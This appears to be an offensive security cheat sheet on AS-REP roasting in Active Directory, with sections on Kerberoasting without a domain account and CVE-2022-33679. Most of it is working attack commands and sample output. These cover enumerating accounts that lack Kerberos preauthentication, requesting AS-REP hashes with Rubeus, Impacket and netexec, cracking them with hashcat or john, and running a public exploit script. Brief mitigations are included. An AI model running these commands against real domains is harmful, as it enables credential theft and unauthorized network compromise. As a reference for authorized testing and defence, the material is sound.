# Roasting - ASREP Roasting

> If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting

**Requirements**:

* Accounts with the attribute **DONT_REQ_PREAUTH**
  * Windows/Linux:
    ```ps1
    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
    ```
  * Windows only:
    ```ps1
    PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
    ```

* [Rubeus](https://github.com/GhostPack/Rubeus)
  ```powershell
  C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
  [*] Action: AS-REP roasting
  [*] Target User            : TestOU3user
  [*] Target Domain          : testlab.local
  [*] SamAccountName         : TestOU3user
  [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
  [*] Using domain controller: testlab.local (192.168.52.100)
  [*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
  [*] Connecting to 192.168.52.100:88
  [*] Sent 169 bytes
  [*] Received 1437 bytes
  [+] AS-REQ w/o preauth successful!
  [*] AS-REP hash:

  $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
  ```

* [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from Impacket Suite
  ```powershell
  $ python GetNPUsers.py htb.local/svc-alfresco -no-pass
  [*] Getting TGT for svc-alfresco
  $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4

  # extract hashes
  root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
  root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
  ```

* netexec Module
  ```powershell
  $ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
  LDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5
  ```

Using `hashcat` or `john` to crack the ticket.

```powershell
# crack AS_REP messages with hashcat
root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
root@windows:hashcat$ hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt

# crack AS_REP messages with john
C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
```

**Mitigations**: 

* All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).


## Kerberoasting w/o domain account

> In September 2022 a vulnerability was discovered by [Charlie Clark](https://exploit.ph/), ST (Service Tickets) can be obtained through KRB_AS_REQ request without having to control any Active Directory account. If a principal can authenticate without pre-authentication (like AS-REP Roasting attack), it is possible to use it to launch an **KRB_AS_REQ** request and trick the request to ask for a **ST** instead of a **encrypted TGT**, by modifying the **sname** attribute in the req-body part of the request.

The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

:warning: You must provide a list of users because we don't have a valid account to query the LDAP using this technique.

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413)
  ```powershell
  GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
  ```
* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139)
  ```powershell
  Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
  ```


## CVE-2022-33679

> CVE-2022-33679 performs an encryption downgrade attack by forcing the KDC to use the RC4-MD4 algorithm and then brute forcing the session key from the AS-REP using a known plaintext attack, Similar to AS-REP Roasting, it works against accounts that have pre-authentication disabled and the attack is unauthenticated meaning we don’t need a client’s password..

Research from Project Zero : https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html

**Requirements**:

* Accounts with the attribute **DONT_REQ_PREAUTH**
  * Windows/Linux:
    ```ps1
    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
    ```
  * Windows only:
    ```ps1
    PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
    ```

* Using [CVE-2022-33679.py](https://github.com/Bdenneu/CVE-2022-33679)
  ```bash
  user@hostname:~$ python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL
  user@hostname:~$ export KRB5CCNAME=/home/project/User.ccache
  user@hostname:~$ netexec smb DC01.DOMAIN.LOCAL -k --shares
  ```

**Mitigations**: 

* All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
* Disable RC4 cipher if possible.


# References

* [Roasting AS-REPs - January 17, 2017 - harmj0y](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
* [Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)